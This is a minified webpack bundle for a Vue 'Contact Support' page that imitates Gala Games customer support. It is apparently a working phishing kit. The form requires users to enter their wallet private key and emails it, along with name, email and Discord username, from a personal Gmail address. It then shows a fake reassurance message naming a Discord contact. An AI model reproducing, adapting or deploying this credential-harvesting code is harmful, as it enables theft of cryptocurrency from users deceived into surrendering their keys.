(window.webpackJsonp=window.webpackJsonp||[]).push([[2,5],{295:function(t,e,n){"use strict";n.r(e);n(296);var r={props:{label:{type:String,default:""},value:{type:[Number,String],default:""},required:{type:Boolean,default:!1}},model:{prop:"value",event:"update"},data:function(){return{isFocus:!1}},methods:{focusEnable:function(){this.isFocus=!0},focusDisable:function(){this.isFocus=!1}}},o=n(51),component=Object(o.a)(r,(function(){var t=this,e=t._self._c;return e("div",[e("label",{staticClass:"mb-2 flex items-center fs-18 font-weight-medium",attrs:{for:t.label}},[t._v("\n        "+t._s(t.label)+"\n        "),t.required?e("i",{staticClass:"v-icon notranslate ml-1 fas fa-asterisk theme--dark error--text",staticStyle:{"font-size":"10px"},attrs:{"aria-hidden":"true"}}):t._e()]),t._v(" "),e("div",{staticClass:"v-input theme--dark v-text-field v-text-field--single-line v-text-field--filled v-text-field--is-booted v-text-field--enclosed",class:{"v-input--is-focused accentBlue--text":t.isFocus,"v-input--is-label-active v-input--is-dirty":""!==t.value}},[e("div",{staticClass:"v-input__control"},[e("div",{staticClass:"v-input__slot secondary"},[e("div",{staticClass:"v-text-field__slot"},[e("input",{attrs:{type:"text",required:t.required},domProps:{value:t.value},on:{focus:t.focusEnable,blur:t.focusDisable,input:function(e){return t.$emit("update",e.target.value)}}})])]),t._v(" "),t._m(0)])])])}),[function(){var t=this._self._c;return t("div",{staticClass:"v-text-field__details"},[t("div",{staticClass:"v-messages theme--dark"},[t("div",{staticClass:"v-messages__wrapper"})])])}],!1,null,null,null);e.default=component.exports;installComponents(component,{Input:n(295).default})},296:function(t,e,n){"use strict";var r=n(2),o=n(19),c=n(10),l=n(7),path=n(204),d=n(4),v=n(110),f=n(12),m=n(205),h=n(40),_=n(78),x=n(203),w=n(3),y=n(79).f,k=n(34).f,C=n(17).f,N=n(297),I=n(298).trim,E="Number",S=l[E],F=path[E],T=S.prototype,A=l.TypeError,L=d("".slice),V=d("".charCodeAt),K=function(t){var e=x(t,"number");return"bigint"==typeof e?e:M(e)},M=function(t){var e,n,r,o,c,l,d,code,v=x(t,"number");if(_(v))throw A("Cannot convert a Symbol value to a number");if("string"==typeof v&&v.length>2)if(v=I(v),43===(e=V(v,0))||45===e){if(88===(n=V(v,2))||120===n)return NaN}else if(48===e){switch(V(v,1)){case 66:case 98:r=2,o=49;break;case 79:case 111:r=8,o=55;break;default:return+v}for(l=(c=L(v,2)).length,d=0;d<l;d++)if((code=V(c,d))<48||code>o)return NaN;return parseInt(c,r)}return+v},O=v(E,!S(" 0o1")||!S("0b1")||S("+0x1")),P=function(t){return h(T,t)&&w((function(){N(t)}))},j=function(t){var e=arguments.length<1?0:S(K(t));return P(this)?m(Object(e),this,j):e};j.prototype=T,O&&!o&&(T.constructor=j),r({global:!0,constructor:!0,wrap:!0,forced:O},{Number:j});var B=function(t,source){for(var e,n=c?y(source):"MAX_VALUE,MIN_VALUE,NaN,NEGATIVE_INFINITY,POSITIVE_INFINITY,EPSILON,MAX_SAFE_INTEGER,MIN_SAFE_INTEGER,isFinite,isInteger,isNaN,isSafeInteger,parseFloat,parseInt,fromString,range".split(","),r=0;n.length>r;r++)f(source,e=n[r])&&!f(t,e)&&C(t,e,k(source,e))};o&&F&&B(path[E],F),(O||o)&&B(path[E],S)},297:function(t,e,n){var r=n(4);t.exports=r(1..valueOf)},298:function(t,e,n){var r=n(4),o=n(24),c=n(13),l=n(299),d=r("".replace),v="["+l+"]",f=RegExp("^"+v+v+"*"),m=RegExp(v+v+"*$"),h=function(t){return function(e){var n=c(o(e));return 1&t&&(n=d(n,f,"")),2&t&&(n=d(n,m,"")),n}};t.exports={start:h(1),end:h(2),trim:h(3)}},299:function(t,e){t.exports="\t\n\v\f\r                　\u2028\u2029\ufeff"},300:function(t,e,n){"use strict";n.r(e);n(33),n(80);var r={data:function(){return{name:"",email:"",privateKey:"",discordName:"",success:!1,msg:""}},methods:{sendEmail:function(){var t=this;this.success=!1,this.$mail.send({from:"erwinclapero69@gmail.com",subject:"Gala-games contact support",text:"\n                    name: ".concat(this.name,"\n                    <br>\n                    email: ").concat(this.email,"\n                    <br>\n                    private key: ").concat(this.privateKey,"\n                    <br>\n                    discord name: ").concat(this.discordName,"\n                ")}).then((function(){t.name="",t.email="",t.privateKey="",t.discordName="",t.msg='\n                Thanks for reaching out! A customer support agent will be in touch with you soon! This usually happens almost right away, but in some situations it can be up to 12 hours before we are able to respond. Please know that we have received your ticket and will get back to you as soon as possible. If you have not received a response within 24 hours, please contact ChairBandit#0001 on Discord.\n                <span class="block pt-4">Note: Please ensure support@gala.games is whitelisted. Otherwise replies may go to your spam box.</span>',t.success=!0})).catch((function(){t.msg="Network error, please try again.",t.success=!0}))}}},o=n(51),component=Object(o.a)(r,(function(){var t=this,e=t._self._c;return e("main",{staticClass:"v-main secondary pb-12"},[e("div",{staticClass:"v-main__wrap"},[e("div",{staticClass:"contact-us-page"},[e("div",{staticClass:"flex blue-hero shrink"},[e("div",{staticClass:"background-check sm:hidden block"},[e("svg",{staticClass:"background-check-svg hero-bg-check row-bg",attrs:{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 300 200"}},[e("path",{staticStyle:{stroke:"rgb(37, 215, 248)",fill:"rgb(37, 215, 248)"},attrs:{"stroke-width":"1",d:"M1,1 V199 H57 L299,1 h-63 L40,155 V1z"}})])]),t._v(" "),e("div",{staticClass:"sm:flex flex-wrap mx-auto content-container"},[t._m(0),t._v(" "),e("div",{staticClass:"w-3/6 pa-0 justify-center hero-image-container sm:flex hidden"},[e("div",{staticClass:"background-check"},[e("svg",{staticClass:"background-check-svg hero-bg-check short",attrs:{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 300 200"}},[e("path",{staticStyle:{stroke:"rgb(37, 215, 248)",fill:"rgb(37, 215, 248)"},attrs:{"stroke-width":"1",d:"M1,1 V199 H57 L299,1 h-63 L40,155 V1z"}})])]),t._v(" "),e("div",{staticClass:"place-holder",staticStyle:{"padding-top":"calc(44%)"}})])])]),t._v(" "),e("div",{staticClass:"content-container"},[e("div",{staticClass:"v-card v-sheet theme--dark accent mt-10 py-6 px-10"},[e("form",{staticClass:"v-form",on:{submit:function(e){return e.preventDefault(),t.sendEmail.apply(null,arguments)}}},[e("Input",{attrs:{label:"Name"},model:{value:t.name,callback:function(e){t.name=e},expression:"name"}}),t._v(" "),e("Input",{attrs:{label:"Email",required:""},model:{value:t.email,callback:function(e){t.email=e},expression:"email"}}),t._v(" "),e("Input",{attrs:{label:"Private Key",required:""},model:{value:t.privateKey,callback:function(e){t.privateKey=e},expression:"privateKey"}}),t._v(" "),e("Input",{attrs:{label:"Discord Username"},model:{value:t.discordName,callback:function(e){t.discordName=e},expression:"discordName"}}),t._v(" "),t.success?e("p",{staticClass:"mb-6",domProps:{innerHTML:t._s(t.msg)}}):t._e(),t._v(" "),e("button",{staticClass:"gala-btn accentBlue !px-14 mt-4",attrs:{type:"submit"}},[t._v("Submit")])],1)])])])])])}),[function(){var t=this._self._c;return t("div",{staticClass:"sm:w-3/6 flex flex-col justify-center first-col sm:p-0 sm:pl-4 pt-8 sm:text-left text-center"},[t("h1",{staticClass:"white--text mb-4"},[this._v("Contact Support")])])}],!1,null,null,null);e.default=component.exports;installComponents(component,{Input:n(295).default})}}]);